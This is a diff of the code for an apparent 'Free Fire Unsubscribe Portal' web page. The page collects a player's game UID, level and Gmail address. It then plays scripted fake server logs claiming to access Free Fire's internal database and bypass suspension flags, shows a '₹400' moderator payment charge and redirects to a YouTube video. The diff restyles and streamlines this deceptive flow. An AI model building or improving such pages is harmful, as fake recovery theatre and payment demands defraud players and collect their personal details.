@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Free Fire Unsubscribe Portal</title>
     <style>
-        /* Global Styles */
+        /* Global Styles & Performance Optimization */
         * {
             margin: 0;
             padding: 0;
@@ -17,83 +17,79 @@
 
         body {
             background-color: #0f0f13;
-            background-image: radial-gradient(circle at 15% 50%, rgba(0, 255, 128, 0.15), transparent 25%),
-                              radial-gradient(circle at 85% 30%, rgba(255, 0, 128, 0.15), transparent 25%);
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
+            /* Optimized background for mobile */
+            background-image: linear-gradient(135deg, rgba(0, 255, 128, 0.05) 0%, rgba(255, 0, 128, 0.05) 100%);
             color: #fff;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 15px;
-            overflow-x: hidden;
-        }
-
-        /* Container - Made Wider & Better Fitting for Mobile */
-        .container {
-            width: 95%;
-            max-width: 550px;
-            perspective: 1000px;
-        }
-
-        .glass-panel {
-            background: rgba(30, 30, 35, 0.45);
-            backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 24px;
-            padding: 40px 25px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6), inset 0 0 0 1px rgba(255, 255, 255, 0.05);
-            position: relative;
             overflow: hidden;
+        }
+
+        /* Container */
+        .container {
+            width: 100%;
+            max-width: 500px;
+        }
+
+        /* Optimized Glass Panel */
+        .glass-panel {
+            background: rgba(20, 20, 25, 0.6);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 35px 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            position: relative;
             transition: transform 0.3s ease;
-            min-height: 550px;
+            min-height: 520px;
             display: flex;
             flex-direction: column;
             justify-content: center;
+            /* Force GPU acceleration */
+            transform: translateZ(0);
         }
 
-        /* Shake Animation for Validation Error */
+        /* Shake Animation */
         @keyframes shakeError {
-            0%, 100% { transform: translateX(0); }
-            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
-            20%, 40%, 60%, 80% { transform: translateX(10px); }
+            0%, 100% { transform: translate3d(0, 0, 0); }
+            10%, 30%, 50%, 70%, 90% { transform: translate3d(-8px, 0, 0); }
+            20%, 40%, 60%, 80% { transform: translate3d(8px, 0, 0); }
         }
 
         .shake {
             animation: shakeError 0.5s cubic-bezier(.36,.07,.19,.97) both;
-            border: 1px solid rgba(255, 51, 102, 0.5);
-            box-shadow: 0 0 20px rgba(255, 51, 102, 0.3);
+            border: 1px solid rgba(255, 51, 102, 0.6);
         }
 
-        /* Header */
         header {
             text-align: center;
             margin-bottom: 25px;
         }
 
         h1 {
-            font-size: 2.2rem;
+            font-size: 2rem;
             color: #00ff44;
             text-transform: uppercase;
             font-weight: 800;
-            text-shadow: 0 0 15px rgba(0, 255, 68, 0.6), 0 0 30px rgba(0, 255, 68, 0.3);
+            text-shadow: 0 0 10px rgba(0, 255, 68, 0.5);
             letter-spacing: 1px;
         }
 
         /* Form Elements */
         .form-group {
-            margin-bottom: 22px;
+            margin-bottom: 20px;
             position: relative;
             width: 100%;
         }
 
         label {
             display: block;
-            margin-bottom: 8px;
-            font-size: 0.95rem;
+            margin-bottom: 6px;
+            font-size: 0.9rem;
             color: #a0a0a5;
             font-weight: 500;
             padding-left: 5px;
@@ -101,13 +97,13 @@
 
         input, select {
             width: 100%;
-            padding: 15px 18px; /* Slightly thicker for better touch */
-            border-radius: 12px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            background: rgba(0, 0, 0, 0.3);
+            padding: 14px 16px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            background: rgba(0, 0, 0, 0.4);
             color: #fff;
             font-size: 1.05rem;
-            transition: all 0.3s ease;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
             outline: none;
             appearance: none;
         }
@@ -126,13 +122,11 @@
 
         input:focus, select:focus {
             border-color: #00ff44;
-            box-shadow: 0 0 15px rgba(0, 255, 68, 0.2);
-            background: rgba(0, 0, 0, 0.5);
         }
 
+        /* Error States */
         input.input-error, select.input-error {
-            border-color: #ff3366;
-            box-shadow: 0 0 10px rgba(255, 51, 102, 0.3);
+            border-color: #ff3366 !important;
         }
 
         .error-msg {
@@ -149,110 +143,101 @@
             background: linear-gradient(135deg, #00ff44, #00b330);
             color: #000;
             border: none;
-            padding: 18px;
-            font-size: 1.25rem;
-            border-radius: 12px;
+            padding: 16px;
+            font-size: 1.2rem;
+            border-radius: 10px;
             cursor: pointer;
             text-transform: uppercase;
             font-weight: 800;
             width: 100%;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 20px rgba(0, 255, 68, 0.3);
-            margin-top: 15px;
-            letter-spacing: 1.5px;
-        }
-
-        .btn-submit:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 25px rgba(0, 255, 68, 0.4);
+            transition: transform 0.2s ease;
+            margin-top: 10px;
+            letter-spacing: 1.2px;
         }
 
         .btn-submit:active {
-            transform: translateY(2px);
+            transform: scale(0.97);
         }
 
-        /* Processing Container (No Box, Just Text on Glass) */
+        /* Processing Text Area (Coding Type Effect) */
         .processing-container {
             display: none;
             flex-direction: column;
             width: 100%;
             height: 100%;
-            padding: 10px;
+            padding: 5px;
         }
 
         .process-log {
             width: 100%;
+            height: 400px;
+            overflow-y: auto;
             display: flex;
             flex-direction: column;
-            gap: 18px;
+            gap: 12px;
+            font-family: 'Courier New', Courier, monospace;
         }
 
-        /* Butter Smooth Deep White Glow Text */
         .log-entry {
-            font-size: 1.15rem;
-            font-weight: 800;
-            color: #fff;
-            opacity: 0;
-            transform: translateY(20px) scale(0.95);
-            filter: blur(4px);
-            transition: all 0.8s cubic-bezier(0.16, 1, 0.3, 1);
-            /* Deep White Glow Effect mixed with base color */
-            text-shadow: 0 0 8px rgba(255, 255, 255, 0.8), 
-                         0 0 15px rgba(255, 255, 255, 0.5), 
-                         0 0 30px rgba(255, 255, 255, 0.3);
+            font-size: 1.05rem;
+            font-weight: bold;
+            color: #ffffff; /* ALL WHITE TEXT */
+            text-shadow: 0 0 8px rgba(255, 255, 255, 0.7); /* WHITE GLOW */
             line-height: 1.4;
-            letter-spacing: 0.5px;
             text-align: left;
+            word-wrap: break-word;
         }
 
-        .log-entry.visible {
-            opacity: 1;
-            transform: translateY(0) scale(1);
-            filter: blur(0);
+        /* Typing cursor */
+        .typing-cursor::after {
+            content: '█';
+            animation: blinkCursor 0.5s infinite;
+            margin-left: 5px;
         }
 
-        /* Cinematic Full Screen Overlay (Layered Animation from Top) */
+        @keyframes blinkCursor {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        /* Magnetic Text Overlay */
         .resubscribe-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
+            background: rgba(0, 0, 0, 0.9);
             display: flex;
             align-items: center;
             justify-content: center;
-            text-align: center;
             z-index: 9999;
-            /* Starts hidden, scaled down, and slightly above */
             opacity: 0;
-            transform: translateY(-50px) scale(0.7);
             pointer-events: none;
-            transition: all 1.2s cubic-bezier(0.25, 1, 0.5, 1);
+            transition: opacity 0.3s ease;
         }
 
-        .resubscribe-overlay.show {
-            opacity: 1;
-            transform: translateY(0) scale(1); /* Zooms in to fill screen */
-            pointer-events: all;
+        .magnetic-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            max-width: 90%;
+            text-align: center;
         }
 
-        .resubscribe-text {
-            font-size: 3rem;
+        .char {
+            font-size: 2.8rem;
             font-weight: 900;
             color: #fff;
             text-transform: uppercase;
-            line-height: 1.3;
-            /* Heavy Glowing Effect */
-            text-shadow: 0 0 20px rgba(0, 255, 68, 0.8), 
-                         0 0 40px rgba(0, 255, 68, 0.6), 
-                         0 0 80px rgba(0, 179, 48, 0.8), 
-                         0 0 120px rgba(255, 255, 255, 0.8);
+            text-shadow: 0 0 15px rgba(255, 255, 255, 0.8), 0 0 30px rgba(255, 255, 255, 0.5);
+            display: inline-block;
+            /* Animation applied via JS */
+            opacity: 0;
+            will-change: transform, opacity;
         }
 
-        /* Original Transition Blinking Screen (No Drop Shadow) */
+        /* Simple Blinking Image */
         .transition-screen {
             position: fixed;
             top: 0;
@@ -266,7 +251,7 @@
             z-index: 10000;
             opacity: 0;
             pointer-events: none;
-            transition: opacity 0.5s ease;
+            transition: opacity 0.3s ease;
         }
 
         .transition-screen.active {
@@ -277,35 +262,30 @@
         .transition-image {
             max-width: 15%;
             max-height: 15%;
-            /* NO drop shadow - pure original image */
-        }
-
-        @keyframes blinkImage {
-            0% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.7; transform: scale(0.95); }
-            100% { opacity: 1; transform: scale(1); }
-        }
-
-        .transition-image.blink {
             animation: blinkImage 1s infinite ease-in-out;
         }
 
+        @keyframes blinkImage {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.6; transform: scale(0.9); }
+        }
+
         @media (max-width: 480px) {
-            .glass-panel { padding: 30px 20px; min-height: 480px; }
-            h1 { font-size: 1.8rem; }
+            .glass-panel { padding: 25px 20px; min-height: 480px; }
+            h1 { font-size: 1.7rem; }
             .transition-image { max-width: 25%; max-height: 25%; }
-            .resubscribe-text { font-size: 2.2rem; }
+            .char { font-size: 2rem; }
         }
     </style>
 </head>
 <body>
 
     <div class="transition-screen" id="transitionScreen">
-        <img src="https://pending404.github.io/image/ff-loding.png" alt="Loading" class="transition-image" id="transitionImage">
+        <img src="https://pending404.github.io/image/ff-loding.png" alt="Loading" class="transition-image">
     </div>
 
     <div class="resubscribe-overlay" id="resubscribeOverlay">
-        <div class="resubscribe-text">Free Fire Gmail<br>Resubscribing</div>
+        <div class="magnetic-container" id="magneticText"></div>
     </div>
 
     <div class="container" id="mainContainer">
@@ -401,9 +381,21 @@
             const formSection = document.getElementById('formSection');
             const processingSection = document.getElementById('processingSection');
             const processLog = document.getElementById('processLog');
+            
             const resubscribeOverlay = document.getElementById('resubscribeOverlay');
+            const magneticTextContainer = document.getElementById('magneticText');
+            
             const transitionScreen = document.getElementById('transitionScreen');
-            const transitionImage = document.getElementById('transitionImage');
+
+            // --- REMOVE RED LINE ON TYPING ---
+            const allInputs = document.querySelectorAll('input, select');
+            allInputs.forEach(input => {
+                input.addEventListener('input', function() {
+                    this.classList.remove('input-error');
+                    const errorMsg = document.getElementById(this.id + 'Error');
+                    if (errorMsg) errorMsg.style.display = 'none';
+                });
+            });
 
             // Form validation logic
             proceedBtn.addEventListener('click', () => {
@@ -416,68 +408,32 @@
                 const level = document.getElementById('level');
                 const gmail = document.getElementById('gmail');
 
-                const uidError = document.getElementById('uidError');
-                const deviceError = document.getElementById('deviceError');
-                const serverError = document.getElementById('serverError');
-                const reasonError = document.getElementById('reasonError');
-                const levelError = document.getElementById('levelError');
-                const gmailError = document.getElementById('gmailError');
+                const validateField = (element, condition) => {
+                    if(condition) {
+                        element.classList.add('input-error');
+                        document.getElementById(element.id + 'Error').style.display = 'block';
+                        isValid = false;
+                    }
+                };
 
-                // Reset visual errors
-                document.querySelectorAll('.input-error').forEach(el => el.classList.remove('input-error'));
-                document.querySelectorAll('.error-msg').forEach(el => el.style.display = 'none');
-
-                // Validations
-                if (uid.value.length < 7 || uid.value.length > 16) {
-                    uid.classList.add('input-error');
-                    uidError.style.display = 'block';
-                    isValid = false;
-                }
-
-                if (device.value === "") {
-                    device.classList.add('input-error');
-                    deviceError.style.display = 'block';
-                    isValid = false;
-                }
-
-                if (server.value === "") {
-                    server.classList.add('input-error');
-                    serverError.style.display = 'block';
-                    isValid = false;
-                }
-
-                if (reason.value === "") {
-                    reason.classList.add('input-error');
-                    reasonError.style.display = 'block';
-                    isValid = false;
-                }
-
+                validateField(uid, uid.value.length < 7 || uid.value.length > 16);
+                validateField(device, device.value === "");
+                validateField(server, server.value === "");
+                validateField(reason, reason.value === "");
+                
                 const lvlNum = parseInt(level.value);
-                if (isNaN(lvlNum) || lvlNum < 11 || lvlNum > 95) {
-                    level.classList.add('input-error');
-                    levelError.style.display = 'block';
-                    isValid = false;
-                }
+                validateField(level, isNaN(lvlNum) || lvlNum < 11 || lvlNum > 95);
 
                 const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                if (!emailRegex.test(gmail.value)) {
-                    gmail.classList.add('input-error');
-                    gmailError.style.display = 'block';
-                    isValid = false;
-                }
+                validateField(gmail, !emailRegex.test(gmail.value));
 
                 if (!isValid) {
                     glassPanel.classList.remove('shake');
                     void glassPanel.offsetWidth; 
                     glassPanel.classList.add('shake');
-                    
-                    setTimeout(() => {
-                        glassPanel.classList.remove('shake');
-                    }, 500);
                     return; 
                 }
 
-                // If Valid -> Start sequence
                 startSequence(uid.value, level.value, gmail.value);
             });
 
@@ -497,81 +453,131 @@
 
                 // 1. Show Blinking Logo First
                 transitionScreen.classList.add('active');
-                transitionImage.classList.add('blink');
 
                 setTimeout(() => {
-                    // Hide Logo
                     transitionScreen.classList.remove('active');
-                    transitionImage.classList.remove('blink');
-
+                    
                     // 2. Hide Form, Show Processing Container
                     formSection.style.display = 'none';
                     processingSection.style.display = 'flex';
 
-                    runTextAnimations(uid, level, maskedEmail);
+                    runFastTypingAnimation(uid, level, maskedEmail);
 
-                }, 2000); // Wait 2 seconds with blinking logo
+                }, 1500); 
             }
 
-            function runTextAnimations(uid, level, maskedEmail) {
-                // Highly detailed server-like logs
+            // --- FAST TYPING CODING EFFECT ---
+            function runFastTypingAnimation(uid, level, maskedEmail) {
                 const logs = [
-                    `<span style="color: #00ccff;">[System] Initiating secure connection to Free Fire Internal DB...</span>`,
-                    `<span style="color: #00ff44;">[Found] UID Account Data: ${uid}</span>`,
-                    `<span style="color: #00ccff;">[Scan] Authenticating Account Level: ${level}...</span>`,
-                    `<span style="color: #ffcc00;">[Fetch] Locating Unsubscribed Gmail ID...</span>`,
-                    `<span style="color: #00ff44;">[Match] Target Email: ${maskedEmail}</span>`,
-                    `<span style="color: #00ccff;">[Process] Bypassing Suspension Flags & Internal Bindings...</span>`,
-                    `<span style="color: #ffcc00;">[Sync] Synchronizing New Gmail Credentials...</span>`,
-                    `<span style="color: #fff; font-size: 1rem;">Moderator payment charges: ₹400</span>`
+                    "[System] Initiating secure connection to Free Fire Internal DB...",
+                    `[Found] UID Account Data: ${uid}`,
+                    `[Scan] Authenticating Account Level: ${level}...`,
+                    "[Fetch] Locating Unsubscribed Gmail ID...",
+                    `[Match] Target Email: ${maskedEmail}`,
+                    "[Process] Bypassing Suspension Flags & Internal Bindings...",
+                    "[Sync] Synchronizing New Gmail Credentials...",
+                    "Moderator payment charges: ₹400"
                 ];
 
-                let index = 0;
-                processLog.innerHTML = ""; 
+                let lineIndex = 0;
 
-                function appendLog() {
-                    if (index < logs.length) {
-                        const div = document.createElement('div');
-                        div.className = 'log-entry';
-                        div.innerHTML = logs[index];
-                        processLog.appendChild(div);
-                        
-                        // Add class to trigger CSS transition
-                        setTimeout(() => div.classList.add('visible'), 50);
+                function typeNextLine() {
+                    if (lineIndex < logs.length) {
+                        const lineDiv = document.createElement('div');
+                        lineDiv.className = 'log-entry typing-cursor';
+                        processLog.appendChild(lineDiv);
 
-                        index++;
-                        let delay = Math.floor(Math.random() * 800) + 800; // 0.8s to 1.6s delay
-                        setTimeout(appendLog, delay);
+                        let charIndex = 0;
+                        const textToType = logs[lineIndex];
+
+                        // Speed: 20ms per character
+                        const typeInterval = setInterval(() => {
+                            if (charIndex < textToType.length) {
+                                lineDiv.textContent += textToType[charIndex];
+                                charIndex++;
+                                processLog.scrollTop = processLog.scrollHeight; // Auto scroll
+                            } else {
+                                clearInterval(typeInterval);
+                                lineDiv.classList.remove('typing-cursor');
+                                lineIndex++;
+                                setTimeout(typeNextLine, 300); // Wait 0.3s before next line
+                            }
+                        }, 20);
+
                     } else {
-                        // 3. After text finishes, trigger the Cinematic Layer Overlay
-                        setTimeout(() => {
-                            showResubscribeOverlay();
-                        }, 1200);
+                        // After all text finished, show magnetic text
+                        setTimeout(triggerMagneticAnimation, 800);
                     }
                 }
 
-                setTimeout(appendLog, 500);
+                typeNextLine();
             }
 
-            function showResubscribeOverlay() {
-                // Show Cinematic Full Screen Popup sliding/zooming from top
-                resubscribeOverlay.style.display = 'flex';
-                setTimeout(() => {
-                    resubscribeOverlay.classList.add('show');
-                }, 50);
+            // --- MAGNETIC LETTER ANIMATION ---
+            function triggerMagneticAnimation() {
+                resubscribeOverlay.style.opacity = '1';
+                resubscribeOverlay.style.pointerEvents = 'all';
 
-                // Wait 3.5 seconds showing the beautiful popup, then go to Logo
-                setTimeout(() => {
-                    // 4. Final Blinking Logo & Redirect
-                    transitionScreen.style.zIndex = "10001"; // Ensure it goes above the overlay
-                    transitionScreen.classList.add('active');
-                    transitionImage.classList.add('blink');
+                const text = "FREE FIRE GMAIL RESUBSCRIBING";
+                magneticTextContainer.innerHTML = '';
 
+                // Create elements with randomized far-away starting points
+                const charElements = [];
+                const words = text.split(' ');
+
+                words.forEach((word, wordIndex) => {
+                    const wordDiv = document.createElement('div');
+                    wordDiv.style.display = 'inline-block';
+                    wordDiv.style.margin = '0 10px';
+
+                    word.split('').forEach(char => {
+                        const span = document.createElement('span');
+                        span.innerText = char;
+                        span.className = 'char';
+                        
+                        // Random positions (far away)
+                        const rx = (Math.random() - 0.5) * 2000;
+                        const ry = (Math.random() - 0.5) * 2000;
+                        const rz = (Math.random() - 0.5) * 1000;
+                        const rotate = (Math.random() - 0.5) * 360;
+                        
+                        span.style.transform = `translate3d(${rx}px, ${ry}px, ${rz}px) rotate(${rotate}deg) scale(3)`;
+                        
+                        wordDiv.appendChild(span);
+                        charElements.push(span);
+                    });
+                    
+                    magneticTextContainer.appendChild(wordDiv);
+                    if (wordIndex === 1) { // Break line after "FIRE"
+                        magneticTextContainer.appendChild(document.createElement('br'));
+                    }
+                });
+
+                // Force reflow
+                void magneticTextContainer.offsetWidth;
+
+                // Animate letters snapping together
+                charElements.forEach((span, i) => {
                     setTimeout(() => {
-                        window.location.href = "https://youtu.be/DK_UsATwoxI?si=lLLHC_Sr5TxTiY2x";
-                    }, 3000);
+                        span.style.transition = 'transform 0.6s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.5s ease';
+                        span.style.transform = 'translate3d(0,0,0) rotate(0deg) scale(1)';
+                        span.style.opacity = '1';
+                    }, i * 40); // Staggering effect
+                });
 
-                }, 3500);
+                // Wait for animation + 2 seconds holding time -> Show Loading Logo
+                setTimeout(() => {
+                    resubscribeOverlay.style.opacity = '0';
+                    setTimeout(() => {
+                        transitionScreen.style.zIndex = "10001";
+                        transitionScreen.classList.add('active');
+
+                        // Final Redirect
+                        setTimeout(() => {
+                            window.location.href = "https://youtu.be/DK_UsATwoxI?si=lLLHC_Sr5TxTiY2x";
+                        }, 2500);
+                    }, 500);
+                }, (charElements.length * 40) + 2000);
             }
         });
     </script>
